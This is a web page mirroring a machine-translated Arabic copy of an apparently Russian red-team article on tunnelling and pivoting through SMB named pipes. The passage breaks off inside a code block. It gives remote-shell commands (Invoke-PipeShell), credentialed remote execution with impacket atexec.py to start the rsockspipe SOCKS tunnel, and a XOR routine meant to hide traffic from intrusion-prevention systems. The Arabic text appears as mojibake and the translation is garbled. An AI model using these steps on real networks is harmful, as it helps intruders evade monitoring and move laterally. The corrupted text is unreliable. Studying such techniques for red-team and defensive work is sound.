<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>โณ๏ธ ๐จ๐ฟโ๐ณ ๐ฉ๐พโโ๏ธ ุจุงุณุชุฎุฏุงู ุฃูุงุจูุจ ูุชุชูุญูุฑ ๐ก๏ธ โ๏ธ ๐จ๐ปโ๐ณ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ููุณ ุณุฑุงู ุฃู IPS ููุดุฑูุงุช ุฃุตุจุญุช ุฃูุซุฑ ุฐูุงุกู ูุฃูุซุฑ ุฐูุงุกู. ูู ุชูุงุฌุฆ ุงูุขู ุฃู ุดุฎุต ูุฏูู IPS ูุน SSL-mitm ุนูู ูุญูุท ุงูุดุจูุฉ ุฃู ุญุชู ุฏุงุฎู ุดุจูุฉ ุงูุดุฑูุฉ ุจูู ุงููุทุงุนุงุช. ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ุจุงุณุชุฎุฏุงู ุฃูุงุจูุจ ูุชุชูุญูุฑ</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/460659/" style=";text-align:right;direction:rtl">  ููุณ ุณุฑุงู ุฃู IPS ููุดุฑูุงุช ุฃุตุจุญุช ุฃูุซุฑ ุฐูุงุกู ูุฃูุซุฑ ุฐูุงุกู.  ูู ุชูุงุฌุฆ ุงูุขู ุฃู ุดุฎุต ูุฏูู IPS ูุน SSL-mitm ุนูู ูุญูุท ุงูุดุจูุฉ ุฃู ุญุชู ุฏุงุฎู ุดุจูุฉ ุงูุดุฑูุฉ ุจูู ุงููุทุงุนุงุช.  ูู ุงูููุช ููุณู ุ ุจุงูุฅุถุงูุฉ ุฅูู IPS ุงููุนุฑููุฉ ุ ุจุฏุฃุช ูุฎุชูู ุญููู EDR ูู ุงูุธููุฑ ูุงูุงูุชุดุงุฑ ุ ูุงูุชู ูู ุจุงููุนู ูุจุงุดุฑุฉ ุนูู ุงููุถูููู ูุดุงูุฏูู ุงูุงุชุตุงูุงุช ุงููุงุฆูุฉ.  ูู ูุฐุง ุงูุตุฏุฏ ุ ูุฒุฏุงุฏ ุตุนูุจุฉ ุฅุฎูุงุก ุงุฎุชุตุงุตู RedTeam ุงููุงุฆู ูู ูุธูุฑ BlueTeam ูู ูู ููุงู.  ูุฌุจ ุฃู ูุตุจุญ ุฃูุซุฑ ุฅุจุฏุงุนูุง ูู ุนููู ุงูุดุงู. <br><br>  ูุฏ ูููู ุฃุญุฏ ุงูุญููู ูุฅุฎูุงุก "ุงูุฅุฌุฑุงุกุงุช ุงูุชุฏููุฑูุฉ ุงูุฃูุซุฑ ูุงุฆุฏุฉ" (ุฌ) ุฏุงุฎู ุดุจูุงุช ุงูุดุฑูุฉ ุงุณุชุฎุฏุงู ุจุฑูุชููููุงุช SMB ุฃู RDP.  ููููู ุงูุงุฎุชุจุงุก ุจุฏุงุฎููุง ูุงูุชุฎูู ุนู ููุณูุง ูุญุฑูุฉ ูุฑูุฑ ูุดุฑูุนุฉ.  ูุฐุง ููุณ ุฌุฏูุฏูุง ุจุดูู ุฎุงุต ููุฏ ุชู ุงุณุชุฎุฏุงู ุชูููุฉ ุงูุชูููุน ุฏุงุฎู SMB ููุฐ ููุช ุดุฑูุงุช APT ุงูุดููุฑุฉ Duqu ู Sauron.  ููุงู ุ ุงุณุชุฎุฏู ุงูุฑุฌุงู ุฃูุถูุง ุจุฑูุชูููู SMB ูููู ุฃูุงูุฑ ุงูุชุญูู ุฅูู ุนููุงุฆูู ุจูุฌุงุญ ูุจูุฑ.  ุจุนุฏ ุฐูู ุ ุชู ุงุนุชูุงุฏ ูุฐู ุงูุชูููุฉ ูู ูุจู ูุทูุฑู Metasploit ู Cobalt Strike. <br><br>  ูู ูุฐู ุงูููุงูุฉ ุ ุณููุธุฑ ูู ุฎูุงุฑุงุช ุงุณุชุฎุฏุงู ุจุฑูุชูููู SMB ููุชุญููู ุ ููููุง ุณูุชุฑู RDP ูุงุญููุง. <br><a name="habracut"></a><br><h3 style=";text-align:right;direction:rtl">  ูุญู ูุณุชุฎุฏู SMB </h3><br>  ูุฐูู ุ ุฏุนูุง ูุฑู ูุง ูู ุฑุงุฆุน ุญูู ุงุณุชุฎุฏุงู SMB ููุชุฑููุฒ. <br><br>  ุฃููุงู ุ ุฅูู ูุงุณุน ุงูุงูุชุดุงุฑ.  SMB ูู ุจุฑูุชูููู Microsoft ุงูุฃุตูู ุชูุฑูุจูุง ุ ููู ุดุจูุงุช ุงูุดุฑูุงุช ุงูุชู ุชุณุชุฎุฏู windows ุ ูุชู ุงุณุชุฎุฏุงูู ูู ูู ููุงู ููู ุฃู ููุงู.  ููุง ุฃูุช ู DFS ุ ูุงูุนุฏูุฏ ูู ุงูุชุญุฏูุซุงุช ุ ูุงูุทุงุจุนุงุช ูุงููุซูุฑ ุ ุงููุซูุฑ ูู ูู ุดูุก.  ูุฑูุญ ุฌุฏุง <br><br>  ุตุญูุญ ุ ุฎุงุฑุฌ ุดุจูุฉ ุงูุดุฑูุฉ ุ ูุฃูุซุฑ ูู ุฐูู ูู ุงูุฎุงุฑุฌ ุ ุฏุงุฎู ูููุฐ TCP 445 ุ ุจุฏุฃูุง ุบุงูุจูุง ูู ุฅุบูุงู ุฌุฏุฑุงู ุงูุญูุงูุฉ.  ูุงูุณุจุจ ูู ุฐูู ูู ุญุงูุงุช ุงูุฎุฏุงุน ูุงูุชุฑุญูู ุงููุชูุฑุฑุฉ ุจุงุณุชุฎุฏุงู ุฑูุงุจุท ูุซู file: // xxxx ุ \\ xxxx \ ุ ุฅูุฎ.  ูุจุทุจูุนุฉ ุงูุญุงู ุ ุฏุนููุง ูุง ููุณู WannaCry ุ ุงูุชู ุฃุฌุจุฑุช ุงูุนุฏูุฏ ูู ุงูููุธูุงุช ุนูู ุฅุบูุงู ุงููููุฐ. <br><br>  ุซุงููุงู ุ ูู ุงูุฃูุธูุฉ ุงูุญุฏูุซุฉ ุ ูุซู Win10 / Win2016 ูุงูุฅุตุฏุงุฑุงุช ุงูุฃุญุฏุซ ุ ูุฅู ุงููุนูููุงุช ุงููุฑุณูุฉ ุฏุงุฎู ุจุฑูุชูููู SMB ุ ูุจุดูู ุฃูุซุฑ ุฏูุฉ ุ ูุชู ุชุดููุฑ SMB3 ุงูุชุฑุงุถููุง ุจุดูู ุงูุชุฑุงุถู.  ุฃู  ููู ุงูุงููุณุงู ุงูููุถู ูุฏูู ุฏุงุฎู SMB ุ ููููู ุฃู ุชุชุฃูุฏ ุจุฃูุงู ูู ุฃู IPS ููุดุฑูุงุช ูู ุชูุงุญุธ ุฐูู (ุดูุฑูุง Micosoft ุนูู ูุฐุง!). <br><br>  ุซุงูุซูุง ุ ูููุฑ ุจุฑูุชูููู SMB ุขููุฉ ููุงุฆูุฉ ููุง ูุณูู ุจุงูุฃูุงุจูุจ (SMB pipe) - ููู ูู ุงููุงูุน ููุณ ุงูุฃูุงุจูุจ ุงููุณูุงุฉ ุ ููู ูุชููุฑุฉ ููุท ุนูู ุงูุดุจูุฉ.  ุนูู ุณุจูู ุงููุซุงู ุ ูุนุฏ ุฎุท ูุซู \\ 192.168.1.10 \ pipe \ atsvc ุนุจุงุฑุฉ ุนู ุฃูุจูุจ ุฎุฏูุฉ ููููุงู ุงููุฌุฏููุฉ.  ูุนูู Atexec ูู ุฅุทุงุฑ impacket ููุท ุนูู ุฅูุดุงุก ููุงู ูุชูููุฐ ุงูุฃูุงูุฑ ูู ุงูุฅุทุงุฑุงุช. <br><br>  ููููู ุฑุคูุฉ ุฌููุน ุงูุฃูุงุจูุจ ุงูููุชูุญุฉ ุนูู ูุธุงูู ุจุงุณุชุฎุฏุงู ุงูุฃุฏุงุฉ ุงููุณุงุนุฏุฉ ูู Sysinternals: pipelist.exe (pipelist64.exe) ุฃู ูู ุฎูุงู ุจูููุฑุดูู ููุณู: <br><br><pre style=";text-align:right;direction:rtl"><code class="plaintext hljs">[System.IO.Directory]::GetFiles("\\.\\pipe\\")</code> </pre> <br><h3 style=";text-align:right;direction:rtl">  ุบูุฑ </h3><br>  ูุฐูู ุ ุฏุนููุง ูุฑู ููู ูููููุง ุงุณุชุฎุฏุงู ุฃูุงุจูุจ SMB ูู ุฃุฌู "ุฃุนูุงููุง ุงููุฏูุฑุฉ ุงูุฃูุซุฑ ูุงุฆุฏุฉ". <br><br>  ูุฑูุฏ ุงุณุชุฎุฏุงู ุฃูุงุจูุจ ููุชูุงุตู ุงูุณุฑู ูุน ูุดุฑุฉ ูุฑูููุง. <br>  ุฎูุงุตุฉ ุงูููู ูู ุฃููุง ูุฏูุฑ ูููููุง ุฃู ุงูุตูุฏูู ุนูู ุงูุฌูุงุฒ ุงููุณุชูุฏู ุ ููุชูุงุตู ูุนู ูู ุฎูุงู ุจุฑูุชูููู SMB. <br><br>  ุนูู ุณุจูู ุงููุซุงู ุ ูู metasplit ููุงู ููุงุฆู paylodes ุฎุงุตุฉ ููุนูู ูุน ุงูุฃูุงุจูุจ: <br>  meterpreter_bind_named_pipe <br>  bind_named_pipe <br><br>  ุจูุณุงุนุฏุชูู ุ ููููู ุจุณูููุฉ "ุชุนููู" ุงููุณุชูุน ุงูุฎุงุต ุจู (ุณูุงุก ูุงู ูุชุฑูู ุฃู ูุดุฑุฉ ุฃูุฑ ุนุงุฏูุฉ) ุนูู ูุงุณูุฑุฉ ูุณูู ุ ูุจุงูุชุงูู ุฅุฎูุงุคูุง ุนู ุฃุนูู ุงููุดุฑู ูู ูุณุคูู ุงูุฃูู.  ูููู ุ ุจุงูุทุจุน ุ ูุญู ูุนูู ุฌูุฏูุง ุฃูู ูู ุบูุฑ ุงูุขูู ุชูุงููุง ุงุณุชุฎุฏุงู peylods msf ุฃุซูุงุก ุงููุชุงู ุงูููุจูุช / redtime ูุฃู ุงููุชุณูููู ุงูุนูุงูููู ุงูุญูููููู ูุณุชุฎุฏููู ุฃุฏูุงุช ูุฎุตุตุฉ ุ ููุง ูููููู - ุจุนูุฏูุง ุนู ุงูุฎุทูุฆุฉ ... <br><br>  ูุฏ ูููู ูุณุงุนุฏูุง ุงููุฏูู - ุจูููุฑุดูู - ุงูุจุฏูู ูููู msf ููุดุฑุฉ ููุงุฏุฉ.  ููุงู ุงูุนุฏูุฏ ูู ุงูุฃูุซูุฉ ุนูู ุงูุดุจูุฉ ุญูู ุงุณุชุฎุฏุงู ุงูุฃูุงุจูุจ ูููุงุฉ ููุชูุงุตู ูุน C2. <br><br>  ูุงุญุฏ ูููู ูู ุงูุฃุฏุงุฉ ุงููุณุงุนุฏุฉ Invoke-PipeShell ูู ูุฑูู Threatexpress.  ุฅูู ูุนูู ูู ูุถุน ุฎุงุฏู ุงูุนููู ููููู ุจุชุดููุฑ ูู ุญุฑูุฉ ุงููุฑูุฑ ุงูุฎุงุตุฉ ุจู ุจุงุณุชุฎุฏุงู ููุชุงุญ AES 256 ุจุช. <br><br>  ุนูู ุงูุฎุงุฏู ุงูุฐู ูููู ุจุชุดุบููู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">Invoke-PipeShell -mode server -aeskey aaaabbbbccccdddd -pipe eventlog_svc -commandtimeout 30</code> </pre> <br>  ุนูู ุงูุนููู ุ ูู ุจุชุดุบูู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">Invoke-PipeShell -mode client -server targetserver.domain.com -aeskey aaaabbbbccccdddd -pipe eventlog_svc -i -timeout 1000</code> </pre> <br>  ุจุทุจูุนุฉ ุงูุญุงู ุ ูุฌุจ ุฃู ูููู ุงูุนููู ูุฎูููุง ุนูู ุงูุฎุงุฏู ุ ูุฐูู ูุง ุชูุณู ุงูุชุฎููู ุฃููุงู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">net use \\targetserver.domain.com\IPC$ /user:admin Password1</code> </pre> <br>  ุจุนุฏ ุงุชุตุงู ูุงุฌุญ ุ ูุญุตู ุนูู ูุญุฏุฉ ุชุญูู Powershell ูุงููุฉ.  ูููู ุงูุญุตูู ุนูู ูู ุงูุชูุงุตูู ุงููุชุนููุฉ ุจุงูุนูู ุจุงุณุชุฎุฏุงู ูุฐู ุงูุฃุฏุงุฉ ุ ููุฐูู ุงูุดูุฑุฉ ููุณูุง. <br><br>  ุญุณูุง.  ูุฐุง ูุจุฏู ูููููุง.  ุงูุขู ุฏุนููุง ูููุฑ ูู ุงูุทุฑููุฉ ุงูุชู ูููููุง ูู ุฎูุงููุง ุงูุชูุฑูุฒ ุฏุงุฎู ุงูุดุจูุฉ ุงููุณุชูุฏูุฉ ุนุจุฑ ุฃูุงุจูุจ SMB.  ุนูู ุณุจูู ุงููุซุงู ุ ุฅุฐุง ูุงู ุงููููุฐ 445 ููุชูุญูุง ููุท ุนูู ูุญูุท ุงูุดุจูุฉ (ููุญุฏุซ ุฐูู ...) ุฃู ุฃู ุงูุงุชุตุงูุงุช ุงูุฎุงุฑุฌุฉ ูู ุงูููู ุนุจุฑ SSL ูุชู ุญุธุฑูุง ุจูุง ุฑุญูุฉ ุจูุงุณุทุฉ ุฌุฏุงุฑ ุญูุงูุฉ ููุดุฑูุฉ ุ ูููู ูุณุจุจ ูุง ูุณูุง ุฅุบูุงู ุจุฑูุชูููู SMB.  ูู ูุฐู ุงูุญุงูุฉ ุ ูุญุชุงุฌ ุฅูู ุฅุนุงุฏุฉ ุชูุฌูู ููู TCP ูุงูู ุฏุงุฎู ุงูุฃูุจูุจ ุญุชู ูุชููู ูู ุงูุนูู ูุน ุงูููุงุฑุฏ ุงูุฏุงุฎููุฉ ููุดุจูุฉ ุงููุณุชูุฏูุฉ.  ุฃูู ูุง ูุชุจุงุฏุฑ ุฅูู ุงูุฐูู ูู ููุณ ุนุฏุงุฏ ูุชุฑ ูุน ุงูุชุฏุฑูุฌ ุนุจุฑ ุงูุฃูุงุจูุจ.  ุงูู ูุนุฑู ููู ููุนู ุฐูู ุชูุงูุง.  ูู ูููุฑ ูู ุงูุชูุงุตูู ููุง ุ ูุฃู  ูู ุดูุก ููุงุณู ููุง ูููุง ููุฏููู.  ูููู ููููุชููู ูุฑุงุกุฉ ุงูุชุนูููุงุช ุงูุฎุงุตุฉ ุจู metasploit ุ ุฃู ุงูุงุทูุงุน ุนูู ุงููุณุฎุฉ ุงููุฎุชุตุฑุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ููุง</a> . <br><br>  ุฐูุฑูุง ุจุงููุนู ูุณุงูุฆ ุงููุชุฑ ุฃุนูุงู.  ูุฐูู ุ ุฏุนูุง ูุฑู ูุงุฐุง ูุฏููุง ูู ุฃุฌู ุงูุชูุญูุฑ ุนุจุฑ ุงูุฃูุงุจูุจ ... <br><br>  ุจุนุฏ googling ุณุฑูุนุฉ ุญูู ููุถูุน ุงูููู ุนุจุฑ ุงูุฃูุงุจูุจ ุ ุจุงูุฅุถุงูุฉ ุฅูู ูุชุฑุชุฑ ุ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุชู ุงูุนุซูุฑ ุนูู</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูููุจุงูุช ุณุชุฑุงูู</a> ููุท ูุงูุชุทููุฑ ูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">DxFlatLine</a> . <br><br>  ุงูุฎูุงุฑ ุงูุฃูู ุ ุฃููุงู ุ ูุชู ุฏูุนู ุ ูุซุงููุงู - ูู ููุณ ุงูุนููุจ ุงูุชู ูุชูุชุน ุจูุง ุนุฏุงุฏ ุงููุชุฑ. <br><br>  ูุชู ุชูููู ุงูุฎูุงุฑ ุงูุซุงูู ุจุงุนุชุจุงุฑู PoC ุ ููู ูุนูู ููุท ูู ูุถุน ุงูุฎููุท ุงูููุฑุฏุฉ ููุณูุญ ูู ุจููู ุงุชุตุงู ูุงุญุฏ ููุท - ููุฐุง ุ ููุง ููููู ุ ูุง ููุซู ุฎูุงุฑูุง ููุงุณุชุฎุฏุงู ุงููุณุชูุฑ ูู ุงูููุงุฑุณุฉ ุงูุนูููุฉ. <br><br><h3 style=";text-align:right;direction:rtl">  ููุงุฐุง ุชูุนูุ </h3><br>  ุจุนุฏ ุงูุชูููุฑ ููููุงู ูู ุงููุดููุฉ ุ ูุฑุฑูุง ... ููุงุฐุง ูุง ูุชููู ูุน ุชุทูุฑูุง ุงูุณุงุจู Rsockstun ุ ุงูุฐู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูุชุจูุง ุนูู</a> ุจุงููุนู ุ ููุนูู ูุน ุงูุฃูุงุจูุจุ  ุนูุงูุฉ ุนูู ุฐูู ุ ุชุณูุญ ูู ุจููุฉ ุงูุชุทุจูู ุจุงูููุงู ุจุฐูู ุจุณูููุฉ.  ุจุฏูุงู ูู ุงูุงุชุตุงู ุนุจุฑ TCP ุ ุณูุณุชุฎุฏู ุงุชุตุงู ุนุจุฑ SMB.  ุฅูู ูุจุณุท ุนูู ุงูุฃุฏุงุฉ ุงููุณุงุนุฏุฉ: ูุง ุฏุงุนู ููููู ุจุดุฃู SSL ุ ูุงูุงุชุตุงู ูู ุฎูุงู ุฎุงุฏู ูููู ุ ุฅูุฎ.  ุณูุชุฑู ููุท ุงูุฎูุงุฑ ุงูุฐู ูุชุถูู ุชูููุถ ุงูุนููู ุงูุฃููู ุนูู ุงูุฎุงุฏู ุจูููุฉ ูุฑูุฑ ุ ูุฃู  ุงูุฃูุงุจูุจ ูู ููุงู ุนุงู ุ ูุจูุงุกู ุนููู ุ ููุณ ููุท ููููุง ุ ูููู ุฃูุถูุง ุงูุจุฑุงูุฌ ุงูุฃุฎุฑู ุ ุจูุง ูู ุฐูู ุนู ุจุนุฏ ุ ูููููุง ุงููุฑุงุกุฉ ูุงููุชุงุจุฉ ุฅูููุง. <br><br>  ุชุนุชุจุฑ ุญููู ุงููุตูู ุฅูู ุงูุฃูุงุจูุจ ุ ุจุงูุฅุถุงูุฉ ุฅูู ูุณุญ ูุชุนุฏุงุฏ ุงูุฃูุงุจูุจ ุนูู ุฌูุงุฒ ุจุนูุฏ ุ ููุถูุนูุง ูููุตููุง ููููุงูุดุฉ.  ูููู ูุฃููุฆู ุงูุฐูู ูุฑุบุจูู ูู ุฏุฑุงุณุชูุง ุจุงุณุชุฎุฏุงู ูุซุงู metasploit ูู ุงููุงุณุญ ุงูุถูุฆู / smb / pipe_auditor ูุงููุญุฏุงุช ุงูููุทูุฉ ุงููุงุณุญ ุงูุถูุฆู / smb / pipe_rpc_auditor. <br><br>  ููุนูู ูุน ุงูุฃูุงุจูุจ ูู Go ุ ุณูู ูุณุชุฎุฏู ููุชุจุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">npipe</a> <br><br>  ููุฏ ุชู ุตูุนู ููุชุฑุฉ ุทูููุฉ ููุฏ ุฃุซุจุช ููุณู ูู ุงูุนุฏูุฏ ูู ุงููุดุงุฑูุน.  ูุง ูุฎุชูู ุงูุนูู ูู ุฎูุงู ูุฐู ุงูููุชุจุฉ ุจุดูู ุฃุณุงุณู ุนู ุงูุนูู ูู ุฎูุงู ุขููุงุช Net ุงูููุงุณูุฉ: ููุณ ุงููุธุงุฆู ูู net.Dial ู net.Listen ู net.Accept. <br><br>  ููุถุงุนูุฉ ุนุฏุฉ ุงุชุตุงูุงุช ุฏุงุฎู ุฃูุจูุจ ูุงุญุฏ ุ ูุซู ุขุฎุฑ ูุฑุฉ ุ ุณูู ูุณุชุฎุฏู Yamux multiplexer ู socks5 - ุฎุงุฏู ูููู.  ููููู ูุฑุงุกุฉ ุงููุฒูุฏ ุญูู ุงูุญุงุฌุฉ ุฅูู ุงูุฅุฑุณุงู ุงููุชุนุฏุฏ ุฏุงุฎู TCP ู yamux ูู ููุงูุชูุง ุงูุฃุฎูุฑุฉ ุญูู rsockstun. <br><br>  ููุงู ุงุฎุชูุงู ุขุฎุฑ ูุตูู ูู ุงูุฅุตุฏุงุฑ ูุน ุงูุฃูุงุจูุจ ุ ููุงุฑูุฉู ุจู rsockstun ุ ููู ุฃูู ูููู ุงูุขู ุชุดุบูู ุฎุงุฏู yamux ุ ูุจูุงุกู ุนูู ุฐูู ุ ูููู ุฅุทูุงู socks5-proxy ุนูู ุทุฑูู ุงูููู (ูุฅู ูู ููู ูู ููุช ูุงุญุฏ ุ ูููู ููุงู ุฃู ููุงู).  ูุชู ุฐูู ุจุญูุซ ูููู ุจูุงุก ุงูููู ุฎุงุฑุฌููุง ูู ุงูุดุจูุฉ ุงููุณุชูุฏูุฉ ูุงูุนูุณ ุตุญูุญ ... <br><br><h3 style=";text-align:right;direction:rtl">  ูุงูุขู ุ ูุงูุนุงุฏุฉ - ุงููุฑูู ุงูุฏูููุฉ </h3><br>  ุงูุดูู 1 - ุชูุฑูุบ ุญุฑูุฉ ุชุดุบูู ุงูููู ุนูู ูููุฏูุฒ 7 <br><br><img src="https://habrastorage.org/webt/o1/rt/py/o1rtpyg-ilui3_t1oov8atg7rqi.png"><br><br>  ููุถุญ ุงูุดูู 1 ููู ุณูุจุฏู ุนูู ููููุง ูุง ุฅุฐุง ูุงู ุฃุญุฏ ููุงูุชู ุนูู ุงูุฃูู ูุนูู ุนูู Windows 7. ููุง ุ ุงูููุทูุฉ ุงูุญูุฑุงุก ูู ูุฑุญูุฉ ุงูุชุฑุฎูุต ุ ูุงูุฃุฎุถุฑ ูู ูุชุญ ุงูุฃูุจูุจ ุ ูุงูุฃุฒุฑู ูู ุงูููู ุงููุจุงุดุฑ ูููุนูููุงุช.  ูู ุงูุถุฑูุฑู ุฃูุถูุง ุงูุงูุชุจุงู ุฅูู ุญูููุฉ ุงุณุชุฎุฏุงู ุจุฑูุชูููู SMBv2.  ูู ุงููุงูุน ุ ูุฐุง ูุนูู ุฃู ูู ูุง ูุฑุณูู ุฏุงุฎู ุงูููู ุณูููู ูุฑุฆููุง ุจูุต ุนุงุฏู: <br><br><img src="https://habrastorage.org/webt/lj/fn/fg/ljfnfgou4hrt_-96cffkpceqvoo.png"><br><br>  ุนูู ุนูุณ Win7 ุ ูุณุชุฎุฏู Windows10 ุชุดููุฑ ุงูุจูุงูุงุช ุฏุงุฎู ุจุฑูุชูููู SMB3: <br><br><img src="https://habrastorage.org/webt/ry/pq/x3/rypqx33huqx-2vkluzijzskg2wa.png"><br><br>  ููุง ูุฑู ุ ูุง ูุชู ููู ุงุณู ุงูุฃูุจูุจ ููุง ุงูุจูุงูุงุช ุงูููุฌูุฏุฉ ุฏุงุฎู ุงูููู ุจูุต ูุงุถุญ. <br><br>  ููููู ุงูุชุญูู ููุง ุฅุฐุง ูุงู ุงูุชุดููุฑ ูุนูู ุนูู ูุธุงู SMB3 ุงูุฎุงุต ุจู ุจุงุณุชุฎุฏุงู cmdlet Powerhell cmdlet ููุงุณู ูุชูููู SmbServerConfiguration <br><br><img src="https://habrastorage.org/webt/wa/er/x3/waerx3qf6kifsizekiomj2iseds.png"><br><br>  ููุน ุฅููุงู ุชุดุบูู ุงูุชุดููุฑ ุ ูููู ุชูุดูุทู ุจููุณ ุงูุณูููุฉ: <br><br><img src="https://habrastorage.org/webt/9t/py/fx/9tpyfxifcsfzbqeldy-9rw3p3qc.png"><br><br>  ููุน ุฐูู ุ ูุง ูููููุง ุฏุงุฆููุง ุงูุชุฃูุฏ ูู ุฃู ุงูุชุดููุฑ ุฏุงุฎู SMB ุณูุชู ุชููููู ุงูุชุฑุงุถููุง ูุฃู ุชุดุบููู ุนูู ุฎุงุฏู ุฃู ุดุจูุฉ ุฃุฌูุจูุฉ ููุณุช ููุฑุฉ ุฌูุฏุฉ ... <br><br>  ูู ูุฐุง ุงูุตุฏุฏ ุ ูุญุชุงุฌ ุฅูู ุชูููุฑ ูุถุน ูู ููููุง ูุณูุญ ุจุชุดููุฑ ุญุฑูุฉ ุงููุฑูุฑ ุฏุงุฎู ุงูููู ุงูุฎุงุต ุจูุง.  ุนูุงูุฉ ุนูู ุฐูู ุ ููุณุช ูุฏููุง ูููุฉ ุชุดููุฑ ููุซูู ุญุชู ูุชููููุง ูู ูู ุชุดููุฑ ููุท ุนูู ุงูููุจููุชุฑ ุงูุนููุงู NSA ุ ูููู ููุท ุฅุฎูุงุก ุชูุงููุน ุญุฑูุฉ ุงููุฑูุฑ ุฏุงุฎู ุงูููู ูู IPS.  ูู ูุฐุง ุงูุตุฏุฏ ุ ุณูู ูุณุชุฎุฏู XOR ุจุณูุทูุง ูุน ููุชุงุญ ุตุบูุฑ ูุฅุฎูุงุก ุญุฑูุฉ ุงููุฑูุฑ ุงูุฎุงุตุฉ ุจูุง ุ ููุง ุณูุชูุญ ููุง ุชูููุฑ ููุงุฑุฏ ุงููุนุงูุฌ ููู ูุคุซุฑ ุนูููุงู ุนูู ุณุฑุนุฉ ุงูููู. <br><br>  ูู ุฃุฌู ุนุฏู ุฅูุดุงุก ุทุจูุฉ ุดุจูุฉ ุฅุถุงููุฉ ูุณุคููุฉ ุนู ุชุดููุฑ ุญุฑูุฉ ุงููุฑูุฑ ุ ุณูุถูู ุงููุธููุฉ ูุจุงุดุฑุฉู ุฅูู ูุญุฏุฉ yamux ุงููุณุคููุฉ ุนู ููู ุงูุญูููุฉ ุงููุงูุนุฉ (ูุญุฏุฉ stream.go ููุธุงุฆู ุงููุฑุงุกุฉ ูุงููุชุงุจุฉ): <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">func xoring(istr *[]byte, key string){ for i := 0; i &lt; len(*istr); i++ {(*istr)[i] = (*istr)[i] ^ key[i % len(key)]} }</code> </pre><br>  ุจุนุฏ ุฅุฌุฑุงุก ุงูุชุบููุฑุงุช ุ ูุง ูููู ุทูุจ GET ูุฏููุง ูุฑุฆููุง ุจูุถูุญ ูู ุญุฑูุฉ ุงููุฑูุฑ: <br><br><img src="https://habrastorage.org/webt/p9/zm/xg/p9zmxgex-2zbojqpbcjuaayqc4m.png"><br><br><h3 style=";text-align:right;direction:rtl">  ูุงุญุฏ ุ ุงุซูุงู ุ ุซูุงุซุฉ ... ุงุจุฏุฃ! </h3><br>  ูู ุงููุฌููุน ุ ุณุชููู ุฎูุงุฑุงุช ุงูุฅุทูุงู ูููููุง ูุชุทุจูู ุงูููู ุนูู ุงููุญู ุงูุชุงูู: <br><br>  <b>ุงูุฎูุงุฑ 1.</b> ุงูุงุชุตุงู ูู ุงูุฎุงุฑุฌ ุจุงูุดุจูุฉ ูุฅุนุงุฏุฉ ุชูุฌูู ุงุชุตุงู Socks5.  ุนูู ุณุจูู ุงููุซุงู ุ ุนูุฏูุง ูููุฏ ุงููููุฐ 445 ููุนุฑู ูุฑูุถ ุงูุชูุตูู: <br><br>  ุนูู ุงูุฎุงุฏู ุงูุฏุงุฎูู ุ ุนุจุฑ ุงุชุตุงู SMB ูุงูุฃุฏุงุฉ ุงููุณุงุนุฏุฉ impacket ุ ุงุจุฏุฃ ุฌุฒุก ุฎุงุฏู rsockpipe: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">./atexec.py administrator:adminPassw0rd@&lt;ext server IP&gt; "rsockspipe.exe -listen .\rsockspipename -pass Password1234"</code> </pre> <br>  ุนูู ุฌูุงุฒ Windows ุงูุฎุงุฑุฌู (ุงูุฐู ูุณูุทุฑ ุนููู ูู ูุจููุง) ุ ูู ุจุชุดุบูู ุฌุฒุก ุงูุนููู ูู rsockspipe ูุจุนุฏ ุฅูุดุงุก ุงูุงุชุตุงู ุ ุงุณุชุฎุฏูู ุจูุซุงุจุฉ ูููู socks5: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext 